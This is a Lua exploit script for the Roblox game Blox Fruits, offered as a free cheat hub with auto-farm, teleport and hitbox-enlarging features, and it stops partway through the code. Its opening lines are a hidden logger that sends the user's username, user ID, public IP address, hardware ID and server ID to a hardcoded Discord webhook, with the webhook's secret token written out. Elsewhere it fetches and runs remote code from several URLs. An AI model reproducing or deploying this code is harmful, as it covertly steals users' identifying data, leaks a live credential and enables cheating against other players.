function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Kaitun Log**",
                ["description"] ="",
                ["type"] = "rich",
                ["color"] = tonumber(0xf93dff),
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**UserID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**PlaceID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**JobID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1267904448307662910/G9qYGFA1ygTZTVTJJHkLD4LmAvSXG7llN2YhbvlxU0B1e1lJLgJTrtcfi8AmrD9eUv_E", AdminLoggerMsg())
-- Script Blox FruiT UI Alchemy
local SlayerzUI_MobileToggle = loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/BrutalityV2/main/mtoggleUI.script"))()
SlayerzUI_MobileToggle:Create("rbxassetid://16058297648") -- batas toggle
repeat wait(1) until game:IsLoaded()
local AlchemyHub_Version = "1.0 [ Free ]"
local AlchemyHub_UserCalling = game.Players.LocalPlayer.Name
local textchange_cooldown = 3
local Alchemy_GameName = "Blox Fruits"
local AlchemyNotify = function(Text_i,Duration_i)
    game.StarterGui:SetCore("SendNotification", {
        Title = "BRUTALITY HUB",
        Text = Text_i,
        Duration = Duration_i,
        Icon = "rbxassetid://16058297648"
    })
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Brutality-V2/main/InviteToDiscord.lua"))()
_G.AlchemyHub_KeySystem = {
	KeySaved = "IDK"
}
local Plr = game.Players.LocalPlayer
if not game:IsLoaded()then 
	print("Wait...")
end
UIThemeColorSave = Color3.fromRGB(0, 255, 145)
LOGOAlchemyLOL = "http://www.roblox.com/asset/?id=16058297648"
_G.Config_AlchemyUI = {
    KeyBind = Enum.KeyCode.Delete
}
print("Wait...")
local Device_Checking = false
local HttpService = game:GetService("HttpService")
local requestt = http_request or request or syn.request
local web_aurl = 'wD8785Ci6CUGuGMs'
local Path = "http://www.roblox.com/asset/?id="
local headers = {
    ["Content-Type"] = "application/json"
}
function _G.WebhookGG_ALX(a,b)
    print(a)
    print(b)
end
[[
local AlchemyHubKeySystem = Instance.new("ScreenGui")
local ShadowFrame = Instance.new("Frame")
local ShadowCorner = Instance.new("UICorner")
local MainFrame = Instance.new("Frame")
local MainCorner = Instance.new("UICorner")
local BackgroundGradient = Instance.new("UIGradient")
local Logo = Instance.new("ImageLabel")
local Name = Instance.new("TextLabel")
local Description = Instance.new("TextLabel")
local KeyBox = Instance.new("TextBox")
local BoxCorner = Instance.new("UICorner")
local Credit = Instance.new("TextLabel")
local Submit = Instance.new("TextButton")
local SubmitCorner = Instance.new("UICorner")
local Button1 = Instance.new("TextButton")
local B1Corner = Instance.new("UICorner")
local Button2 = Instance.new("TextButton")
local B2Corner = Instance.new("UICorner")
local Logo = Instance.new("ImageLabel")
local ShadowCloseFrame = Instance.new("Frame")
local ShadowCloseCorner = Instance.new("UICorner")
local CloseFrame = Instance.new("Frame")
local CloseGradient = Instance.new("UIGradient")
local CloseCorner = Instance.new("UICorner")
local CloseX = Instance.new("TextButton")
local ShadowPremiumFrame = Instance.new("Frame")
local ShadowPremiumCorner = Instance.new("UICorner")
local PremiumFrame = Instance.new("Frame")
local CloseGradient_2 = Instance.new("UIGradient")
local CloseCorner_2 = Instance.new("UICorner")
local Premium = Instance.new("ImageButton")
AlchemyHubKeySystem.Name = "MedusaScript-KeySystem"
AlchemyHubKeySystem.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
AlchemyHubKeySystem.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ShadowFrame.Name = "ShadowFrame"
ShadowFrame.Parent = AlchemyHubKeySystem
ShadowFrame.AnchorPoint = Vector2.new(0.5, 0.5)
ShadowFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ShadowFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
ShadowFrame.Size = UDim2.new(0, 450, 0, 200)
ShadowFrame.ZIndex = 0
ShadowCorner.Name = "ShadowCorner"
ShadowCorner.Parent = ShadowFrame
MainFrame.Name = "MainFrame"
MainFrame.Parent = ShadowFrame
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Position = UDim2.new(0.48666665, 0, 0.469999969, 0)
MainFrame.Size = UDim2.new(0, 450, 0, 200)
MainFrame.ZIndex = 0
MainCorner.Name = "MainCorner"
MainCorner.Parent = MainFrame
BackgroundGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 175, 82)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 67, 41))}
BackgroundGradient.Rotation = 45
BackgroundGradient.Name = "BackgroundGradient"
BackgroundGradient.Parent = MainFrame
Logo.Name = "Logo"
Logo.Parent = MainFrame
Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Logo.BackgroundTransparency = 1.000
Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0.217777774, 0, -0.0949999988, 0)
Logo.Size = UDim2.new(0, 250, 0, 250)
Logo.Image = "rbxassetid://16058297648"
Logo.ImageTransparency = 0.300
Name.Name = "Name"
Name.Parent = MainFrame
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.ClipsDescendants = true
Name.Position = UDim2.new(0, 0, 0.0700000003, 0)
Name.Size = UDim2.new(0, 448, 0, 39)
Name.Font = Enum.Font.GothamBold
Name.Text = "Medusa Script"
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextSize = 33.000
Description.Name = "Description"
Description.Parent = MainFrame
Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description.BackgroundTransparency = 1.000
Description.ClipsDescendants = true
Description.Position = UDim2.new(0.0311111119, 0, 0.25, 0)
Description.Size = UDim2.new(0, 420, 0, 37)
Description.Font = Enum.Font.Gotham
Description.Text = "Free Script Hub Support PC/Mobile with Many Function Smooth High Perfomance And Anit Detection !"
Description.TextColor3 = Color3.fromRGB(255, 255, 255)
Description.TextSize = 16.000
Description.TextWrapped = true
KeyBox.Name = "KeyBox"
KeyBox.Parent = MainFrame
KeyBox.AnchorPoint = Vector2.new(0.5, 0.5)
KeyBox.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
KeyBox.ClipsDescendants = true
KeyBox.Position = UDim2.new(0.49777779, 0, 0.529999971, 0)
KeyBox.Size = UDim2.new(0, 422, 0, 26)
KeyBox.ClearTextOnFocus = false
KeyBox.Font = Enum.Font.Arial
KeyBox.PlaceholderColor3 = Color3.fromRGB(70, 70, 70)
KeyBox.PlaceholderText = "Type Key Here ..."
KeyBox.Text = ""
KeyBox.TextColor3 = Color3.fromRGB(30, 30, 30)
KeyBox.TextSize = 16.000
BoxCorner.Name = "BoxCorner"
BoxCorner.Parent = KeyBox
Credit.Name = "Credit"
Credit.Parent = MainFrame
Credit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credit.BackgroundTransparency = 1.000
Credit.ClipsDescendants = true
Credit.Position = UDim2.new(0.0222222228, 0, 0.894999981, 0)
Credit.Size = UDim2.new(0, 432, 0, 21)
Credit.Font = Enum.Font.GothamBold
Credit.Text = "UI By Medusa"
Credit.TextColor3 = Color3.fromRGB(255, 255, 255)
Credit.TextSize = 16.000
Credit.TextTransparency = 0.500
Credit.TextXAlignment = Enum.TextXAlignment.Right
Submit.Name = "Submit"
Submit.Parent = MainFrame
Submit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Submit.BackgroundTransparency = 0.800
Submit.Position = UDim2.new(0.280000001, 0, 0.629999995, 0)
Submit.Size = UDim2.new(0, 195, 0, 23)
Submit.Font = Enum.Font.GothamBold
Submit.Text = "Submit"
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.TextSize = 20.000
SubmitCorner.Name = "SubmitCorner"
SubmitCorner.Parent = Submit
Button1.Name = "Button1"
Button1.Parent = MainFrame
Button1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button1.BackgroundTransparency = 0.800
Button1.Position = UDim2.new(0.144444451, 0, 0.777105093, 0)
Button1.Size = UDim2.new(0, 155, 0, 23)
Button1.Font = Enum.Font.GothamBold
Button1.Text = "Discord"
Button1.TextColor3 = Color3.fromRGB(255, 255, 255)
Button1.TextSize = 20.000
B1Corner.Name = "B1Corner"
B1Corner.Parent = Button1
Button2.Name = "Button2"
Button2.Parent = MainFrame
Button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button2.BackgroundTransparency = 0.800
Button2.Position = UDim2.new(0.50444442, 0, 0.777105093, 0)
Button2.Size = UDim2.new(0, 155, 0, 23)
Button2.Font = Enum.Font.GothamBold
Button2.Text = "Get Key"
Button2.TextColor3 = Color3.fromRGB(255, 255, 255)
Button2.TextSize = 20.000
B2Corner.Name = "B2Corner"
B2Corner.Parent = Button2
ShadowCloseFrame.Name = "ShadowCloseFrame"
ShadowCloseFrame.Parent = ShadowFrame
ShadowCloseFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ShadowCloseFrame.BorderColor3 = Color3.fromRGB(30, 30, 30)
ShadowCloseFrame.BorderSizePixel = 0
ShadowCloseFrame.Position = UDim2.new(1.0177778, 0, 0, 0)
ShadowCloseFrame.Size = UDim2.new(0, 50, 0, 50)
ShadowCloseCorner.Name = "ShadowCloseCorner"
ShadowCloseCorner.Parent = ShadowCloseFrame
CloseFrame.Name = "CloseFrame"
CloseFrame.Parent = ShadowCloseFrame
CloseFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
CloseFrame.BorderSizePixel = 0
CloseFrame.Position = UDim2.new(-0.12444336, 0, -0.129999995, 0)
CloseFrame.Size = UDim2.new(0, 50, 0, 50)
CloseGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 175, 82)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 67, 41))}
CloseGradient.Rotation = 45
CloseGradient.Name = "CloseGradient"
CloseGradient.Parent = CloseFrame
CloseCorner.Name = "CloseCorner"
CloseCorner.Parent = CloseFrame
CloseX.Name = "CloseX"
CloseX.Parent = CloseFrame
CloseX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseX.BackgroundTransparency = 1.000
CloseX.BorderColor3 = Color3.fromRGB(0, 0, 0)
CloseX.BorderSizePixel = 0
CloseX.Position = UDim2.new(0.119999997, 0, 0.119999997, 0)
CloseX.Size = UDim2.new(0, 37, 0, 37)
CloseX.Font = Enum.Font.GothamBold
CloseX.Text = "X"
CloseX.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseX.TextSize = 36.000
ShadowPremiumFrame.Name = "ShadowPremiumFrame"
ShadowPremiumFrame.Parent = ShadowFrame
ShadowPremiumFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ShadowPremiumFrame.BorderColor3 = Color3.fromRGB(30, 30, 30)
ShadowPremiumFrame.BorderSizePixel = 0
ShadowPremiumFrame.Position = UDim2.new(1.0177778, 0, 0.284999996, 0)
ShadowPremiumFrame.Size = UDim2.new(0, 50, 0, 50)
ShadowPremiumCorner.Name = "ShadowPremiumCorner"
ShadowPremiumCorner.Parent = ShadowPremiumFrame
PremiumFrame.Name = "PremiumFrame"
PremiumFrame.Parent = ShadowPremiumFrame
PremiumFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PremiumFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
PremiumFrame.BorderSizePixel = 0
PremiumFrame.Position = UDim2.new(-0.12444336, 0, -0.129999995, 0)
PremiumFrame.Size = UDim2.new(0, 50, 0, 50)
CloseGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 175, 82)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 67, 41))}
CloseGradient_2.Rotation = 45
CloseGradient_2.Name = "CloseGradient"
CloseGradient_2.Parent = PremiumFrame
CloseCorner_2.Name = "CloseCorner"
CloseCorner_2.Parent = PremiumFrame
Premium.Name = "Premium"
Premium.Parent = PremiumFrame
Premium.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Premium.BackgroundTransparency = 2.000
Premium.BorderColor3 = Color3.fromRGB(0, 0, 0)
Premium.BorderSizePixel = 0
Premium.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
Premium.Size = UDim2.new(0, 30, 0, 30)
Premium.Image = "rbxassetid://16058297648"

-- Panda Authenticating System
local LibVersion = "v2" -- ( v3 & v4 )
local LibType = "roblox" -- Available ( FiveM or Roblox ) always use small letter
local service_name = "Brutality_Hub"
--https://pandadevelopment.net/servicelib?service=alchemy_hub&core=roblox&param=v2
local PandaAuth = loadstring(game:HttpGet('https://pandadevelopment.net/servicelib?service='..service_name..'&core='..LibType..'&param='..LibVersion))()
local debugMode = true;

function DebugMode(text)
    if debugMode then
        print("[Client] - "..text)
    end
end

spawn(function()
	pcall(function()
		while wait(1) do
            Name.Text = "Brutality Hub"
            Description.Text = "Free Script Hub Support PC/Mobile with Many Function Smooth High Perfomance And Anit Detection !"
            Credit.Text = " UI By MedusaScript"
            Logo.Image = LOGOAlchemyLOL
		end
	end)
end)
local foldername = "_brutalityhub_KeySaved"
local filename = "KeyToday.json"
function saveSettings()
    local HttpService = game:GetService("HttpService")
    local json = HttpService:JSONEncode(_G.AlchemyHub_KeySystem)
    if (writefile) then
        if isfolder(foldername) then
			if isfile(foldername.."\\"..filename) then
				writefile(foldername.."\\"..filename, json)
			else
				writefile(foldername.."\\"..filename, json)
			end
        else
            makefolder(foldername)
			writefile(foldername.."\\"..filename, json)
        end
    end
end
function loadSettings()
    local HttpService = game:GetService("HttpService")
    if isfile(foldername.."\\"..filename) then
        _G.AlchemyHub_KeySystem = HttpService:JSONDecode(readfile(foldername.."\\"..filename))
    end
end
loadSettings()
getgenv().Continue = true
getgenv().ChargeTime = 3
local GETKeyLink_Gen = PandaAuth:GetKey(service_name)
local LibraryNotify = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/luable/main/notify.lua"))()
if getgenv().Continue == true then
    local LibraryNotify = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/luable/main/notify.lua"))()
    LibraryNotify:Notification({ Text = "Load Saved Key", Duration = 3 })
    wait()
    Button1.MouseButton1Click:Connect(function()
        Button1.Text = "Copy Success"
        LibraryNotify:Notification({ Text = "If the copy fails, look in the Console.", Duration = 3 })
        LibraryNotify:Notification({ Text = "Copy : https://discord.gg/dUdzZskBCC", Duration = 3 })
        setclipboard("https://discord.gg/dUdzZskBCC")
        wait(0.5)
        Button1.Text = "Discord"
    end)
    Button2.MouseButton1Click:Connect(function()
        Button2.Text = "Copy Success"
        LibraryNotify:Notification({ Text = "If the copy fails, look in the Console.", Duration = 3 })
        LibraryNotify:Notification({ Text = "Copy : "..GETKeyLink_Gen , Duration = 3 })
        setclipboard(GETKeyLink_Gen)
        wait(0.5)
        Button2.Text = "Get Key"
    end)
    CloseX.MouseButton1Click:Connect(function()
        wait(1)
        ShadowFrame.Position = UDim2.new(1000, 0, 1000, 0)
    end)
    Premium.MouseButton1Click:Connect(function()
        LibraryNotify:Notification({ Text = "You haven't bought Premium yet.", Duration = 3 })
    end)
    Submit.MouseButton1Click:Connect(function()
        local KeyInput = KeyBox.Text
        DebugMode("Validating Key")
        DebugMode("Service: ".. service_name)
        DebugMode("Key: "..KeyInput)
        if PandaAuth:ValidateKey(service_name, KeyInput) then
            _G.AlchemyHub_KeySystem.KeySaved = KeyInput
            saveSettings()
            LibraryNotify:Notification({ Text = "Saving Key...", Duration = 3 })
            print("Save Key!")
            KeyAuth_CheckingPassing = true
            ShadowFrame.Position = UDim2.new(1000, 0, 1000, 0)
        else
            KeyBox.Text = ""
            KeyBox.PlaceholderText = "Incorrect Key !"
            wait(0.5)
            KeyBox.PlaceholderText = "Type Key Here ..."
        end
    end)
    if _G.AlchemyHub_KeySystem.KeySaved == nil then
        LibraryNotify:Notification({ Text = "Saved Key : Nill", Duration = 3 })
    else
        LibraryNotify:Notification({ Text = "Please wait, Database is lagging", Duration = 5 })
        local KeyForSave = tostring(_G.AlchemyHub_KeySystem.KeySaved) 
        
        DebugMode("Validating Key")
        DebugMode("Service: ".. service_name)
        DebugMode("Key: "..KeyForSave)

        if PandaAuth:ValidateKey(service_name, KeyForSave) then
            print("Yep!")
            LibraryNotify:Notification({ Text = "Saved Key is correct", Duration = 3 })
            KeyAuth_CheckingPassing = true
            ShadowFrame.Position = UDim2.new(1000, 0, 1000, 0)
        else
            LibraryNotify:Notification({ Text = "Saved Key is incorrect", Duration = 3 })
        end
    end
end
repeat wait(1) until KeyAuth_CheckingPassing == true
]]
print("SUCCESS EPIC")
local Plr = game.Players.LocalPlayer
wait()
local Plr = game.Players.LocalPlayer
local Pid = game.PlaceId
_G.GoToBF = false
if Pid == 2753915549 then
    _G.WebhookGG_ALX("Game","BloxFruits : First Sea")
elseif Pid == 4442272183 then
    _G.WebhookGG_ALX("Game","BloxFruits : Second Sea")
elseif Pid == 7449423635 then
    _G.WebhookGG_ALX("Game","BloxFruits : Third Sea")
else
    _G.WebhookGG_ALX("Game","Not Support")
    game.Players.LocalPlayer:Kick("Game Not Support")
end
local Plr = game.Players.LocalPlayer
local Connection = {}
local Highlight_Folder = Instance.new("Folder")
Highlight_Folder.Name = "Highlight_Folder"
Highlight_Folder.Parent = game.CoreGui
local Highlight = function(Target)
    local Highlight = Instance.new("Highlight")
    Highlight.Name = Target.Name
    Highlight.FillColor = Color3.fromRGB(0, 255, 145)
    Highlight.DepthMode = "AlwaysOnTop"
    Highlight.FillTransparency = 0.7
    Highlight.OutlineColor = Color3.fromRGB(0, 255, 145)
    Highlight.Parent = Highlight_Folder
    if Target.Character then
        Highlight.Adornee = Target.Character
    end
    Connection[Target] = Target.CharacterAdded:Connect(function(Characters)
        Highlight.Adornee = Characters
    end)
end
Highlight(Plr)
wait(0.1)
AlchemyNotify("Thanks for using Medusa Script!",5)
wait(0.1)
AlchemyNotify("discord.gg/medusascript",5)
wait(0.5)
local Notification = require(game:GetService("ReplicatedStorage").Notification)
Notification.new("<Color=Cyan>Brutality V 1.0<Color=/>"):Display()
wait(0.5)
Notification.new("<Color=Yellow>Please Subscribe Medusa Script<Color=/>"):Display()
wait(1)
local SlayerzLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-Neptune/SlayerzUI/main/Library.script"))()

local Name = "Brutality | Blox Fruits"
local Description = "Version : 1.0 [ Free ] | User : "..game.Players.LocalPlayer.Name.." Toggle : Del"
local Image = "rbxassetid://16058297648"
local Color = Color3.fromRGB(0, 255, 145)

local Window = SlayerzLibrary:Window(Name,Description,Image,Color)

local Tab = Window:Tab("General","9158926514")
local Tab1 = Window:Tab(" Auto","9092095556")
local Tab2 = Window:Tab("Combat ","7072724538")
local Tab4 = Window:Tab("Travel","6035190846")
local Tab3 = Window:Tab(" Shop","7072715646")
local Tab6 = Window:Tab("Misc","6663675885")

local Section = Tab:Section("- Auto Farm -","Left")
local Section2 = Tab:Section("- Setting -","Right")
local Section3 = Tab:Section("- Farm Boss -","Left")
local Mys1 = Tab1:Section("- Race Upgrade -","Left")
local Mys = Tab1:Section("- Mirage -","Left")
local Mys3 = Tab1:Section("- Sea Event -","Right")
local Section10 = Tab1:Section("- Auto Other -","Left")
local TusitaSSCZ = Tab:Section("- Tusita -","Right")
_G.Select_Distance = 40
_G.SpeedTween = 400
getgenv().ToPos = function(p)
    task.spawn(function()
        pcall(function()
            if game:GetService("Players").LocalPlayer:DistanceFromCharacter(p.Position) <= _G.SpeedTween then 
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p
            elseif not game.Players.LocalPlayer.Character:FindFirstChild("Root")then 
                local K = Instance.new("Part",game.Players.LocalPlayer.Character)
                K.Size = Vector3.new(1,0.5,1)
                K.Name = "Root"
                K.Anchored = true
                K.Transparency = 1
                K.CanCollide = false
                K.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,20,0)
            end
            local U = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude
            local z = game:service("TweenService")
            local B = TweenInfo.new((p.Position-game.Players.LocalPlayer.Character.Root.Position).Magnitude/300,Enum.EasingStyle.Linear)
            local S,g = pcall(function()
            local q = z:Create(game.Players.LocalPlayer.Character.Root,B,{CFrame = p})
            q:Play()
        end)
        if not S then 
            return g
        end
        game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            if S and game.Players.LocalPlayer.Character:FindFirstChild("Root") then 
                pcall(function()
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 50 then 
                        spawn(function()
                            pcall(function()
                                if (game.Players.LocalPlayer.Character.Root.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 80 then 
                                    game.Players.LocalPlayer.Character.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                else 
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Players.LocalPlayer.Character.Root.CFrame
                                end
                            end)
                        end)
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude >= 25 and(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 40 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-p.Position).Magnitude < 25 then 
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
                    end
                end)
            end
        end)
    end)
end
function Hop()
    local PlaceID = game.PlaceId
    local AllIDs = {}
    local foundAnything = ""
    local actualHour = os.date("!*t").hour
    local Deleted = false
    function TPReturner()
        local Site;
        if foundAnything == "" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = ""
        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        wait()
                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                end
            end
        end
    end
    function Teleport() 
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= "" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end
function Attack()
    pcall(function()
        wait()
        game:GetService'VirtualUser':CaptureController()
        game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
    end)
end
pcall(function()
    repeat wait()   
        if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
            for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
                v.Function()
            end
        end
    until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
end)

local placeId = game.PlaceId
if placeId == 2753915549 then
    firstsea = true
elseif placeId == 4442272183 then
    secondsea = true
elseif placeId == 7449423635 then
    thirdsea = true
end
        
function totarget(p)
local Distance2 = (p.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
local tween_s = game:service"TweenService"
local info = TweenInfo.new(Distance2/350, Enum.EasingStyle.Linear)
local tween = tween_s:Create(game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = p})
tween:Play()
if Distance2 <= 150 then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p
end
end
function toX2(targetPos, targetCFrame)
    local tweenfunc = {}
    local tween_s = game:service"TweenService"
    local info = TweenInfo.new((targetPos - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude/300, Enum.EasingStyle.Linear)
    local tween = tween_s:Create(game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = targetCFrame * CFrame.fromAxisAngle(Vector3.new(1,0,0), math.rad(0))})
    tween:Play()
    function tweenfunc:Stop()
        tween:Cancel()
        return tween
    end
    if not tween then return tween end
    return tweenfunc
end
function EquipWeapon(ToolSe)
    if not _G.NotAutoEquip then
        if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
            Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
            wait(.1)
            game.Players.LocalPlayer.Character.Humanoid:EquipTool(Tool)
        end
    end
end
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

function EquipTool(Tool)
    pcall(function()
    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[Tool])
    end)
end

Section10:Label(" ─────── Use with Farm ─────── ")
local ItemFA = Tab1:Section("- Farm Items -","Right")
ItemFA:Toggle("Auto Farm Gunpowder ( Sea 3 )",false,function(v)
    _G.AutoGunPowder = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.AutoGunPowder and StartMagnetGunPowderMon and (v.Name == "Pistol Billionaire") and (v.HumanoidRootPart.Position - PosGunPowderMon.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosGunPowderMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.AutoGunPowder then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Pistol Billionaire") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Pistol Billionaire" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetGunPowderMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosGunPowderMon = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.AutoGunPowder == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetGunPowderMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Pistol Billionaire" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-450.4010925292969, 219.2162322998047, 6021.25830078125))
                end
            end)
        end
    end
end)
ItemFA:Toggle("Auto Farm Dragon Scale ( Sea 3 )",false,function(v)
    _G.AutoDragonScale = v
    _G.NChest = v
    _G.NonEffect = v
    _G.ToolEPPA = v
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.AutoDragonScale and StartMagnetDragonScaleMon and (v.Name == "Dragon Crew Warrior" or v.Name == "Dragon Crew Archer") and (v.HumanoidRootPart.Position - PosDragonScaleMon.Position).magnitude <= 350 then
